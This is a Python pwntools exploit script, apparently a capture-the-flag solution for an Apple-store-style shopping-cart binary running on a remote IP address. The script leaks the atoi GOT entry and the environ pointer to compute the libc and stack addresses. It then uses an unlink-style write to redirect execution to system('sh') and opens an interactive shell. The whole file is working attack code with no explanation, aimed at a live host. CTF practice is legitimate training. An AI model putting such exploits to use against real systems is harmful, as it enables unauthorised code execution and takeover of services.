#!/usr/bin/env python

from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('140.113.209.24', 10002)

def add(dev_num):
    r.recvuntil('> ')
    r.sendline('2')
    sleep(0.1)
    r.sendline(str(dev_num))

# get iphone8 in order to insert a stack address in list
[add(1) for _ in range(18)]
add(2)
add(4)
add(4)
[add(3) for _ in range(5)]
r.sendline('5')
sleep(0.1)
r.sendline('y')
sleep(0.1)

# fake stack to leak libc function
atoi_got = 0x0804b040
r.sendline('4')
sleep(0.1)
r.sendline('y' + '\x00' + p32(atoi_got) + p32(0x1))
r.recvuntil('26:')
r.recvuntil('27: ')
x = r.recvuntil('-')
atoi = u32(x[:4])
print hex(atoi)

libc = ELF('libc.so.6')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
base = atoi - libc.symbols['atoi']
print hex(base)

environ = base + libc.symbols['environ']
system = base + libc.symbols['system']

print 'system:', hex(system)

# leak stack address
r.sendline('4')
r.recvrepeat(0.1)
r.sendline('y' + '\x00' + p32(environ) + p32(0x1))
r.recvuntil('26:')
r.recvuntil('27: ')
x = r.recvuntil('-')
stack = u32(x[:4])
print hex(stack)

unlink_ret = stack-0x100  # remember to -0x10 for ebp
handler_buf = stack-0xe4


raw_input("#")

r.sendline('3')
r.recvrepeat(0.1)                              # FD(handler_ebp)      # BK(start at after 27)
r.sendline('27' + p32(environ) + p32(system) + p32(unlink_ret-0x10) + p32(0x804b05f))
r.recvrepeat(0.1)


r.sendline('sh\x00' + p32(system) + p32(0xdeadbeef) + p32(0x0) + p32(0xf7643083))


r.interactive()
